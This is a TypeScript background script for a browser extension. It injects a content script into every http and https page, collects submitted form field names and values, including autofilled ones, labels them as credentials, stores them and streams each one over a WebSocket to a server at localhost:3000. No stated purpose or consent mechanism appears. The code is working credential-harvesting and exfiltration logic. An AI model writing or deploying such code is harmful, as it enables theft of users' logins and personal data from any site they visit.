
// Background script to handle communication between content scripts and the extension

// WebSocket connection
let ws: WebSocket | null = null;
let reconnectTimeout: number | null = null;
let isConnecting = false;
const SERVER_URL = 'ws://localhost:3000';

// Queue for storing messages when socket is not connected
const messageQueue: any[] = [];

// Store collected credentials
const credentials: any[] = [];

// Function to connect to WebSocket server
const connectWebSocket = () => {
  if (ws !== null || isConnecting) return;
  
  isConnecting = true;
  
  try {
    ws = new WebSocket(SERVER_URL);
    
    ws.onopen = () => {
      console.log('WebSocket connected');
      isConnecting = false;
      
      // Send any queued messages
      while (messageQueue.length > 0) {
        const message = messageQueue.shift();
        sendToServer(message);
      }
      
      // Update connection status for the popup
      chrome.runtime.sendMessage({
        type: 'CONNECTION_STATUS',
        status: 'connected'
      });
    };
    
    ws.onmessage = (event) => {
      console.log('Message from server:', event.data);
      // Forward message to popup if it's open
      chrome.runtime.sendMessage({
        type: 'SERVER_MESSAGE',
        data: event.data
      });
    };
    
    ws.onerror = (error) => {
      console.error('WebSocket error:', error);
    };
    
    ws.onclose = () => {
      console.log('WebSocket disconnected');
      ws = null;
      isConnecting = false;
      
      // Update connection status for the popup
      chrome.runtime.sendMessage({
        type: 'CONNECTION_STATUS',
        status: 'disconnected'
      });
      
      // Try to reconnect after a delay
      if (reconnectTimeout === null) {
        reconnectTimeout = window.setTimeout(() => {
          reconnectTimeout = null;
          connectWebSocket();
        }, 3000);
      }
    };
  } catch (error) {
    console.error('Failed to connect to WebSocket:', error);
    ws = null;
    isConnecting = false;
    
    // Try to reconnect after a delay
    if (reconnectTimeout === null) {
      reconnectTimeout = window.setTimeout(() => {
        reconnectTimeout = null;
        connectWebSocket();
      }, 3000);
    }
  }
};

// Function to send data to the server
const sendToServer = (data: any) => {
  if (ws && ws.readyState === WebSocket.OPEN) {
    ws.send(JSON.stringify(data));
    return true;
  } else {
    // Queue the message for later
    messageQueue.push(data);
    // Try to connect if not already connecting
    connectWebSocket();
    return false;
  }
};

// Process form data from content scripts
const processFormData = (message: any) => {
  const { url, title, timestamp, data } = message;
  
  data.forEach((formData: any) => {
    const credentialId = `cred-${Date.now()}-${Math.random().toString(36).substr(2, 9)}`;
    const fields = formData.inputs.map((input: any) => ({
      type: input.type,
      name: input.name,
      value: input.value
    }));
    
    const isAutoFill = formData.inputs.some((input: any) => input.isAutoFill);
    
    const credential = {
      id: credentialId,
      url,
      title,
      timestamp,
      fields,
      isAutoFill
    };
    
    // Store the credential
    credentials.push(credential);
    
    // Send to server
    sendToServer({
      type: 'NEW_CREDENTIAL',
      credential
    });
    
    // Update the popup if it's open
    chrome.runtime.sendMessage({
      type: 'NEW_CREDENTIAL',
      credential
    });
  });
};

// Listen for messages from content scripts and popup
chrome.runtime.onMessage.addListener((message, sender, sendResponse) => {
  if (message.type === 'FORM_DATA') {
    processFormData(message);
    sendResponse({ success: true });
  } else if (message.type === 'GET_CREDENTIALS') {
    sendResponse({ credentials });
    
    // Also notify via server if connected
    sendToServer({
      type: 'REFRESH_CREDENTIALS_REQUEST',
      timestamp: Date.now()
    });
  } else if (message.type === 'CLEAR_CREDENTIALS') {
    credentials.length = 0;
    sendResponse({ success: true });
    
    // Also notify server if connected
    sendToServer({
      type: 'CLEAR_CREDENTIALS',
      timestamp: Date.now()
    });
  } else if (message.type === 'GET_CONNECTION_STATUS') {
    sendResponse({
      status: (ws && ws.readyState === WebSocket.OPEN) ? 'connected' : 'disconnected'
    });
  }
  
  return true; // Required for async sendResponse
});

// Connect to WebSocket server on startup
connectWebSocket();

// Register content script programmatically for all pages
chrome.scripting?.registerContentScripts([{
  id: 'content-script',
  matches: ['http://*/*', 'https://*/*'],
  js: ['contentScript.js'],
  runAt: 'document_end'
}])
.catch(err => console.error('Failed to register content script:', err));
